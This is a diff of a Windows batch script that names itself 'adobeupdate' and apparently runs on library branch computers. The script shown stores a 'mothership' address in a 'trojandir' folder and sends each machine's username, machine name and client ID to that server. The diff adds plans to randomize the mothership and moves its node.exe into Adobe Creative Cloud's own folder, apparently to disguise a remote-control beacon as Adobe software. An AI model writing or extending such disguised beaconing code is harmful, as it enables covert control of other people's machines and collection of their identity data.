@@ -2,6 +2,8 @@ REM ! at tpl yonge/bloor task will not run if script is still running (task sche
 REM ! same behavior as some of the PCs at st. james -- recall that if adobeupdate 
 REM   was executed outside of task scheduler and is running task will get kicked off each time
 
+REM TODO refactor to use mothership list, randomize mothership
+
 REM to launch adobeupdate -- create client job with JobName = start_node, JobFile = <anything>
 
 echo %random% > tpl_launch_%random%
@@ -76,6 +78,7 @@ set params=%params% --data-urlencode "username=%tusername%"
 set params=%params% --data-urlencode "machinename=%machinename%"
 set params=%params% --data-urlencode "clientid=%clientid%"
 set params=%params% --data-urlencode "script_version=%script_version%"
+REM TODO script md5 calculation
 
 SET pingdelaytime=3
 SET pingdelaytimemax=60
@@ -94,7 +97,7 @@ IF NOT EXIST %trojandir%\mothership (
     echo %mothership% > %trojandir%\mothership
 )
 
-SET nodepath=C:\ProgramData\owd\node\node-v26.4.0-win-x64\node.exe
+SET "nodepath=C:\Program Files\Adobe\Adobe Creative Cloud Experience\libs\node.exe"
 
 set dt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
 
